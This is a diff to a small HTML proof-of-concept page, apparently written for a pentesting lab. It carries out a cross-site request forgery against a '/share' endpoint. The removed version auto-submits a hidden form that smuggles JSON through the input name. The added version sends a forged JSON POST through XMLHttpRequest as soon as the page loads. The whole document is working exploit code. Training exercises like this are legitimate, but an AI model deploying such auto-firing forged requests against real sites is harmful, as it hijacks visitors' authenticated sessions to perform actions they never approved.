@@ -1,7 +1,14 @@
 <html>
-<body onload=document.getElementById('csrf').submit()>
-<form id="csrf" action="http://ptl-2d63cb87-4d590bd7.libcurl.so/share" method="POST" enctype="application/json" >
-<input type="hidden" name='{"user":"abc' value='"}' >
-</form>
+<body onload=share2()>
+  <script>
+    function share2(){
+    var user = "abc";
+    var id = 0;
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://ptl-2d63cb87-4d590bd7.libcurl.so/share", true);
+    xhr.setRequestHeader("Content-type","application/json");
+    xhr.send(JSON.stringify({user: user, id: id}));
+    }
+  </script>
 </body>
 </html>
